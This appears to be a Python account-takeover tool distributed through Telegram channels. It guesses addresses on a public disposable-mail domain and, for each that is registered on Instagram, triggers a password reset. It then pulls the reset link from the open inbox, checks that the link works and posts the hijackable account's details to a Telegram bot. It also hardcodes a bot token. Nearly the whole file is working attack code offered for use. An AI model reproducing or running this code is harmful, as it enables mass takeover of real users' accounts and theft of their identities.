# THIS TOOL MADE BY @zyksu / CHANNEL - @zyksufirst / PORTAL - @zyksuportal 
#DON'T COPY THIS FILE '
import os
import re
import html
import time
import uuid
import base64
import random
import string
import json
import requests
from threading import Thread, Lock
from collections import deque
import httpx
import webbrowser
import sys
from cfonts import render

# ==============================
# CONFIG & GLOBALS
# ==============================
THREAD_COUNT = 50
used_usernames = set()
lock = Lock()

# Stats
hit = 0
bad_ig = 0
no_ig = 0
checked = 0

# Last 15 mails list
recent_logs = deque(maxlen=15)

ig_session = requests.Session()

TOKEN = ""
CHAT_ID = ""

EXPIRY_FILE = ".expiry_start"
VALID_HOURS = 9000
PASSWORD    = "ZYKSUSPAM"

VERIFY_BOT_TOKEN = "9032605949:AAHg6GieuMUjoxo1EcPFCk0trbO46zUgKqE"
CHANNELS_TO_JOIN = ["@zyksufirst", "@zyksuportal", "@zyksuchat"]

LAVENDER = "\033[38;5;183m"
RESET    = "\033[0m"
red      = "\033[1m\033[31m"
green    = "\033[1m\033[32m"
yellow   = "\033[1m\033[33m"
blue     = "\033[1m\033[34m"
magenta  = "\033[1m\033[35m"
cyan     = "\033[1m\033[36m"
white    = "\033[1m\033[37m"
reset    = RESET

script_running = True

# ==============================
# UI FUNCTIONS
# ==============================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing(text, delay=0.02, color=green):
    for ch in text:
        sys.stdout.write(color + ch)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()

def spinner(text, duration=1.0, color=green):
    frames = ['|', '/', '-', '\\']
    start = time.time()
    i = 0
    while time.time() - start < duration:
        sys.stdout.write(f"\r{color}▸ {text} {frames[i % len(frames)]}{reset}   ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f"\r{color}▸ {text} ✓{reset}   \n")
    sys.stdout.flush()

def hline(color=yellow, width=60):
    print(f"{color}{'─' * width}{reset}")
    
def header():
    clear()
    logo = render(' ZYKSU', font='block', colors=['cyan', 'magenta'], align='left', space=True)
    print(logo)
    hline(yellow)
    left  = f"{yellow}{reset} {magenta}𝐓𝐆 - 𝐙𝐘𝐊𝐒𝐔 𝐄𝐌𝐏𝐈𝐑𝐄{reset}"
    mid   = f"{cyan}𝐌𝐀𝐈𝐋𝐅𝐎𝐑𝐒𝐏𝐀𝐌 {reset}"
    right = f"{magenta}𝐃𝐄𝐕 𝐙𝐘𝐊𝐒𝐔{reset}"
    print(f" {left}  {white}|{reset}  {mid}  {white}|{reset}  {right}")
    hline(yellow)
    print()

# ==============================
# STATUS BOARD (Ekdum Clean 1 Line)
# ==============================
def draw_status():
    # Format numbers with fixed width for alignment
    h_str  = f"{hit:<5}"
    bi_str = f"{bad_ig:<5}"
    ni_str = f"{no_ig:<5}"
    c_str  = f"{checked:<5}"

    board = f"""
{yellow}╭─────────────────────────────────────────────────────╮

   {blue}𝗧𝗚 - 𝗭𝗬𝗞𝗦𝗨 𝗘𝗠𝗣𝗜𝗥𝗘{reset} {white}|{reset} {cyan} 𝗜𝗚 - 𝗛𝗨𝗡𝗧𝗘𝗥{reset} {white}|{reset} {blue} 𝗗𝗘𝗩 - 𝗭𝗬𝗞𝗦𝗨{reset}
{yellow}
╰─────────────────────────────────────────────────────╯

{yellow}╭─────────────────────────────────────────────────────╮
   
   {green}𝗛𝗜𝗧𝗦:{h_str}{reset}{blue}𝗕𝗔𝗗 𝗜𝗚:{bi_str}{reset}{red}𝗡𝗢 𝗜𝗚:{ni_str}{reset}{yellow}𝗖𝗛𝗘𝗖𝗞𝗘𝗗:{c_str}{reset}
{yellow}╰─────────────────────────────────────────────────────╯

{white}  --- 𝗟𝗜𝗩𝗘 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗧𝗨𝗦 ---{reset}
"""
    display_logs = list(recent_logs)[-15:]
    for _ in range(15 - len(display_logs)):
        board += " \n"
        
    for log in display_logs:
        board += log + "\n"

    sys.stdout.write("\033[H\033[J")
    print(board)
    sys.stdout.flush()

def file_active_check():
    spinner("𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐅𝐈𝐋𝐄 𝐀𝐂𝐓𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐔𝐒", duration=3.0, color=green)
    if not os.path.exists(EXPIRY_FILE):
        with open(EXPIRY_FILE, "w") as f:
            f.write(str(time.time()))
        print(f"  {green}✓ 𝐅𝐈𝐋𝐄 𝐀𝐂𝐓𝐈𝐕𝐄.....{reset}\n")
        return True
    try:
        with open(EXPIRY_FILE, "r") as f:
            started = float(f.read().strip())
    except (ValueError, OSError):
        with open(EXPIRY_FILE, "w") as f:
            f.write(str(time.time()))
        print(f"  {green}✓ 𝐅𝐈𝐋𝐄 𝐀𝐂𝐓𝐈𝐕𝐄.....{reset}\n")
        return True
    if time.time() - started >= VALID_HOURS * 3600:
        print(f"  {red}✗ 𝐅𝐈𝐋𝐄 𝐄𝐗𝐏𝐈𝐑𝐄𝐃.....{reset}\n")
        return False
    print(f"  {green}✓ 𝐅𝐈𝐋𝐄 𝐀𝐂𝐓𝐈𝐕𝐄.....{reset}\n")
    return True

def verify_user_joined(user_id):
    missing_channels = []
    for channel in CHANNELS_TO_JOIN:
        try:
            url = f"https://api.telegram.org/bot{VERIFY_BOT_TOKEN}/getChatMember"
            payload = {"chat_id": channel, "user_id": user_id}
            r = requests.post(url, json=payload, timeout=5)
            data = r.json()
            if not data.get("ok"):
                missing_channels.append(channel)
                continue
            status = data.get("result", {}).get("status")
            if status not in ["member", "administrator", "creator"]:
                missing_channels.append(channel)
        except Exception:
            missing_channels.append(channel)
    return len(missing_channels) == 0, missing_channels

# ==============================
# INSTAGRAM & TELEGRAM LOGIC
# ==============================
def get_user_id(username):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
        response = requests.get(f"https://www.instagram.com/{username}/", headers=headers, timeout=10)
        if response.status_code == 200:
            patterns = [r'"profilePage_(\d+)"', r'"id":"(\d+)"', r'"user_id":"(\d+)"', r'ownerId":"(\d+)"']
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match: return match.group(1)
        return None
    except: return None

def get_profile(user_id):
    try:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(user_id), "render_surface": "PROFILE"}),
            "doc_id": "7663723823674585"
        }
        response = ig_session.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": data["lsd"]}, data=data, timeout=15)
        user = response.json().get('data', {}).get('user', {})
        if not user: return None
        return {
            "username": user.get('username'), "full_name": user.get('full_name'),
            "followers": user.get('follower_count', 0), "following": user.get('following_count', 0),
            "posts": user.get('media_count', 0), "is_private": "Yes" if user.get('is_private') else "No",
        }
    except: return None

def send_tg(msg_html):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg_html, "parse_mode": "HTML", "disable_web_page_preview": "true"}, timeout=10)
    except: pass

def info(email, username, rest_link):
    global hit
    with lock:
        hit += 1
        recent_logs.append(f"{green}  [+] HIT: {email}{reset}")
        draw_status()

    username_clean = username if username else None
    profile_link = f"instagram.com/{username_clean}" if username_clean else "None"

    extra = None
    if username_clean:
        uid = get_user_id(username_clean)
        if uid: extra = get_profile(uid)

    if extra:
        full_name = extra["full_name"] or "None"
        followers = extra["followers"]
        following = extra["following"]
        is_private = extra["is_private"]
    else:
        full_name = "None"; followers = "None"; following = "None"; is_private = "None"

    msg_html = (
        "𝐍𝐄𝐖 𝐇𝐈𝐓𝐒 𝐁𝐘 #𝗭𝗬𝗞𝗦𝗨\n"
        f"Name: <code>{full_name}</code>\n"
        f"𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 => <code>@{username_clean}</code>\n"
        f"📧 {email} \n"
        f"👥 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 => <code>{followers}</code>\n"
        f"👥 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 => <code>{following}</code>\n"
        f"🔒 𝙿𝚛𝚒𝚟𝚊𝚝𝚎 => <code>{is_private}</code>\n"
        f"🔗 <a href='{rest_link}'>Reset Link</a>\n"
        f"🌐 {profile_link} \n"
        "❝ 𝐁𝐲 @zyksu  ❞"
    )
    
    with open('hits_mailforspam.txt', 'a') as ff:
        ff.write(f'{email} | {rest_link}\n')
        
    send_tg(msg_html)

# ==============================
# RESET & VERIFY LOGIC
# ==============================
def wrest_reset_email(full_email):
    try:
        ig_did = str(uuid.uuid4()).upper()
        mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
        headers = {
            "User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ig-app-id": "567067343352427",
            "x-ig-device-id": ig_did,
            "x-ig-www-claim": "0",
            "x-csrftoken": "missing",
            "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
        }
        resp = httpx.Client(http2=True, timeout=15).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": full_email}, headers=headers)
        body = (resp.text or "").lower()
        return resp.status_code == 200 and '"status":"fail"' not in body and '"status": "fail"' not in body
    except: return False

def wait_for_reset(email, max_wait=10, interval=2):
    h = {'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://mailforspam.com', 'referer': 'https://mailforspam.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    deadline = time.time() + max_wait
    while time.time() < deadline:
        time.sleep(interval)
        try:
            r = requests.get(f'https://api.mailforspam.com/api/mailboxes/{email}/emails', params={'page': '1', 'page_size': '100'}, headers=h, timeout=10).json()
            emails = r.get("emails") or []
            if not emails: continue
            di = emails[0]["id"]
            body = requests.get(f'https://api.mailforspam.com/api/mailboxes/{email}/emails/{di}', headers=h, timeout=10).json().get("body_html", "") or ""
            m = re.search(r'https?://[^\s"\'<>]*accounts/password/reset/confirm/\?[^\s"\'<>]*', body)
            if m:
                rest_link = html.unescape(m.group(0))
                u = re.search(r'Hi\s+([A-Za-z0-9._]+)\s*,', body)
                return di, rest_link, u.group(1) if u else None
        except: continue
    return None, None, None

def verify_reset_link(link):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept-Language": "en-US,en;q=0.9"}
        r = requests.get(link, headers=headers, timeout=10, allow_redirects=True)
        text = r.text.lower()
        if "choose a way to log in" in text or "login" in text or "log in" in text: return False
        if "new password" in text or "change password" in text or "password" in text: return True
        return False
    except: return False

# ==============================
# WORKER
# ==============================
def worker():
    global checked, no_ig, bad_ig
    
    while script_running:
        try:
            charset = string.ascii_lowercase + "0123456789"
            chosen_user = ''.join(random.choice(charset) for _ in range(random.choice([3, 4, 5, 6, 7])))

            with lock:
                if chosen_user in used_usernames: continue
                used_usernames.add(chosen_user)
                checked += 1
                email = chosen_user + "@mailforspam.com"
                recent_logs.append(f"{white}  [{checked}] Checking: {email}{reset}")
                draw_status()

            url = "https://i.instagram.com/api/v1/users/check_email/"
            response = httpx.Client(http2=True, timeout=10).post(url, data=f"email={email}", headers={'User-Agent': "Instagram 166.0.0.30.120 Android", 'content-type': "application/x-www-form-urlencoded; charset=UTF-8"})

            if 'email_is_taken' in response.text:
                if wrest_reset_email(email):
                    di, rest_link, username = wait_for_reset(email)
                    if di:
                        if verify_reset_link(rest_link):
                            info(email, username, rest_link)
                        else:
                            with lock:
                                bad_ig += 1
                                recent_logs.append(f"{red}  [x] INVALID LINK: {email}{reset}")
                                draw_status()
                    else:
                        with lock: 
                            bad_ig += 1
                            recent_logs.append(f"{red}  [x] BAD IG: {email}{reset}")
                            draw_status()
                else:
                    with lock: 
                        bad_ig += 1
                        recent_logs.append(f"{red}  [x] BAD IG: {email}{reset}")
                        draw_status()
            else:
                with lock: 
                    no_ig += 1
                    recent_logs.append(f"{red}  [-] NO IG: {email}{reset}")
                    draw_status()
            
            time.sleep(0.1)
        except Exception:
            time.sleep(0.5)

# ==============================
# MAIN FLOW
# ==============================
def main():
    global TOKEN, CHAT_ID, script_running
    
    header()
    typing("  >>> 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 𝗝𝗔𝗖𝗞𝗜𝗡𝗚 𝗙𝗜𝗟𝗘...", 0.01, green)
    typing("  >>> 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗦𝗘𝗥𝗩𝗘𝗥...", 0.01, green)
    typing("  >>> 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗦𝗘𝗥𝗩𝗘𝗥...   ", 0.01, green)
    typing("  >>> 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗕𝗢𝗧... ", 0.01, green)
    typing("  >>> 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗜𝗗", 0.01, green)
    typing("  >>> 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗 ", 0.01, green)

    if not file_active_check():
        script_running = False
        sys.exit()

    print("✅ 𝗦𝗖𝗥𝗜𝗣𝗧 𝗜𝗦 𝗔𝗖𝗧𝗜𝗩𝗘 \n")

    entered_pass = input(f"{LAVENDER}𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {RESET}").strip()
    if entered_pass != PASSWORD:
        print(f"\n{red}❌ 𝗪𝗥𝗢𝗡𝗚 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 > 𝗚𝗢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗙𝗢𝗥 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 @zyksufirst{reset}")
        time.sleep(2)
        script_running = False
        sys.exit()
    else:
        print(f"{green}✅ 𝗟𝗢𝗚𝗜𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬{reset}\n")
    
    time.sleep(1)

    header()
    print(f"  {red} 𝐌𝐔𝐒𝐓 𝐍𝐄𝐄𝐃 𝐓𝐎 𝐉𝐎𝐈𝐍 𝐓𝐇𝐈𝐒 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒 :{reset}")
    hline(yellow)
    print(f"  {LAVENDER}[1]{reset} @zyksufirst")
    print(f"  {LAVENDER}[2]{reset} @zyksuportal")
    print(f"  {LAVENDER}[3]{reset} @zyksuchat")
    hline(yellow)
    print()
    
    print(f"  {cyan}▸{reset} {blue}𝐓𝐆 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍{reset}")
    TOKEN = input(f"  {cyan}➜ {reset}").strip()
    print()
    print(f"  {cyan}▸{reset} {blue}𝐓𝐆 𝐂𝐇𝐀𝐓 𝐈𝐃 (Joined User ID){reset}")
    CHAT_ID = input(f"  {cyan}➜ {reset}").strip()
    
    spinner("𝐕𝐄𝐑𝐈𝐅𝐘𝐈𝐍𝐆 𝐀𝐂𝐂𝐄𝐒𝐒", duration=2.0, color=green)
    
    is_joined, missing = verify_user_joined(CHAT_ID)
    if not is_joined:
        print(f"\n{red}❌ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 !{reset}")
        print(f"{red}YOU HAVEN'T JOIN THIS CHANNEL{reset}")
        print(f"{yellow}MISSING: {', '.join(missing)}{reset}\n")
        time.sleep(3)
        script_running = False
        sys.exit()
    else:
        print(f"{green}✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃 ! 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗧𝗛𝗘 𝗛𝗨𝗡𝗧.{reset}\n")
        
        try:
            webbrowser.open("https://t.me/zyksufirst")
        except:
            pass
    
    time.sleep(1)
    
    print(f"\n{green}𝐅𝐈𝐋𝐄 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 𝐖𝐀𝐈𝐓 𝐅𝐄𝗪 𝗠𝗜𝗡𝗨𝗧𝗘𝗦...{reset}")
    time.sleep(1)

    startup_msg = """
╔═════════════════════╗
           🚀𝐙𝐘𝐊𝐒𝐔 𝐕2 𝐓𝐎𝐎𝐋🚀
 ⚡𝐌𝐀𝐈𝐋𝐅𝐎𝐑𝐒𝐏𝐀𝐌 𝐕𝐈𝐏 𝐓𝐎𝐎𝐋⚡
╚═════════════════════╝
━━━━━━━━━━━━━━━━━━━━━━━
 𝐁𝐎𝐓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘
 𝐅𝐈𝐋𝐄 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 𝐈𝐍 𝐒𝐄𝐑𝐕𝐄𝐑
 𝐙𝐘𝐊𝐒𝐔 𝐌𝐀𝐈𝐋 𝐅𝐎𝐑 𝐒𝐏𝐀𝐌 𝐓𝐎𝐎𝐋
━━━━━━━━━━━━━━━━━━━━━━
    ⚡𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 - @zyksu
━━━━━━━━━━━━━━━━━━━━━━
"""
    send_tg(startup_msg)

    for _ in range(THREAD_COUNT):
        Thread(target=worker, daemon=True).start()

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        script_running = False
        print(f"\n{red}𝐒𝐓𝐎𝐏𝐏𝐄𝐃{reset}")

if __name__ == "__main__":
    main()
